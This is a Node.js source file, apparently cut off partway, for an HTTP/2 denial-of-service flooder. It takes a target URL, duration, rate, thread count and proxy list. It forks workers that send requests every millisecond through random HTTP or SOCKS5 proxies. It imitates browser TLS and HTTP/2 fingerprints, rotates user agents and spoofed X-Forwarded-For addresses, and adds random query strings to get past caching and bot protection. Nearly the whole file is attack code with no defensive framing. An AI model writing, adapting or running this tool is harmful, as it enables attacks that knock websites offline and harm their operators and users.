const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`.`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
 }
 
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target); 
 class NetSocket {
     constructor(){}
 
     async SOCKS5(options, callback) {

      const address = options.address.split(':');
      socks.createConnection({
        proxy: {
          host: options.host,
          port: options.port,
          type: 5
        },
        command: 'connect',
        destination: {
          host: address[0],
          port: +address[1]
        }
      }, (error, info) => {
        if (error) {
          return callback(undefined, error);
        } else {
          return callback(info.socket, undefined);
        }
      });
     }
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}


 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        //console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            //console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
	setInterval(runFlooder,1)
}
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        duckduckgo: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};
const generateHeaders = (browser) => {
    const versions = {
    chrome: { min: 115, max: 124 },
    safari: { min: 14, max: 16 },
    brave: { min: 115, max: 124 },
    firefox: { min: 99, max: 112 },
    mobile: { min: 85, max: 105 },
    opera: { min: 70, max: 90 },
    operagx: { min: 70, max: 90 },
    duckduckgo: { min: 12, max: 16 }
};

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
    brave: "90.0.4430.212",
    chrome: "90.0.4430.212",
    firefox: "88.0",
    safari: "14.1",
    mobile: "90.0.4430.212",
    opera: "90.0.4430.212",
    operagx: "90.0.4430.212",
    duckduckgo: "7.0"
};

    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
    chrome: "Win64",
    safari: "macOS",
    brave: "Linux",
    firefox: "Linux",
    mobile: "Android",
    opera: "Linux",
    operagx: "Linux",
    duckduckgo: "macOS"
};
    const platform = platforms[browser];

    const userAgents = {
    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(99 + Math.random() * 15)}.0) Gecko/20100101 Firefox/${Math.floor(99 + Math.random() * 15)}.0`,
    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 4)}.0 Safari/605.1.15`,
    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(90 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0`,
    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(90 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 (Edition GX)`,
    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(1 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 500)}`,
    mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`,
    duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/605.1.15`
};
    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
const secChUaMobile = browser === "mobile" ? "?1" : "?0";
const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
const accept = Math.random() < 0.5 
  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
  : "application/json";
  
const secChUaPlatform = Math.random() < 0.5 ? '"Windows"' : '"Linux"';
const secChUaFull = Math.random() < 0.5 ? '"Google Chrome";v="118", "Chromium";v="118"' : '"Mozilla Firefox";v="118"';
const secFetchDest = Math.random() < 0.5 ? "document" : "image";
const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
const secFetchSite = Math.random() < 0.5 ? "same-origin" : "cross-site";

const acceptLanguage = Math.random() < 0.5 
  ? "en-US,en;q=0.9" 
  : Math.random() < 0.5 
  ? "en-GB,en;q=0.9" 
  : "es-ES,es;q=0.8,en;q=0.7";

const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";

const connection = Math.random() < 0.5 ? "keep-alive" : "close";

const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";

const referer = Math.random() < 0.5 
  ? "https://www.google.com" 
  : "https://www.bing.com";
  
const xForwardedFor = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

const te = Math.random() < 0.5 ? "trailers" : "gzip";

const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";
// Path acak yang lebih bervariasi
function getRandomPath() {
    const paths = [
        "/about", 
        "/products", 
        "/contact", 
        "/news", 
        "/services", 
        "/blog/post-" + Math.floor(Math.random() * 1000), 
        "/article/" + Math.floor(Math.random() * 1000),
        "/category/" + Math.floor(Math.random() * 10),
        "/shop/product-" + Math.floor(Math.random() * 500),
        "/portfolio", 
        "/faq", 
        "/support", 
        "/store/item-" + Math.floor(Math.random() * 1000),
        "/events/" + Math.floor(Math.random() * 200)
    ];
    return paths[Math.floor(Math.random() * paths.length)];
}
    const headersMap = {
    brave: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(115 + Math.random() * 10)}.0.0.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
    chrome: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
    safari: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Safari";v="${Math.floor(115 + Math.random() * 10)}", "AppleWebKit";v="${Math.floor(537 + Math.random() * 20)}"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "macOS" : "iOS",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X ${Math.random() < 0.5 ? "10_14_6" : "10_15_7"}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 10)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.apple.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
    mobile: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "Android",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(9 + Math.random() * 5)}.${Math.floor(Math.random() * 10)}; Mobile; rv:${Math.floor(60 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://m.example.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
    firefox: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(70 + Math.random() * 10)}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64; rv:${Math.floor(70 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.mozilla.org/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
    opera: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Opera";v="${Math.floor(75 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(75 + Math.random() * 10)}.0.0.0`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
    operagx: {
        ":method": "GET",
        ":authority": Math.random() < 0.5 
            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
        "sec-ch-ua": `"Opera GX";v="${Math.floor(80 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(80 + Math.random() * 10)}.0.0.0 GX`,
        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/gx",
        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "dnt": "1",
        "upgrade-insecure-requests": "1",
        "cache-control": "max-age=0"
    },
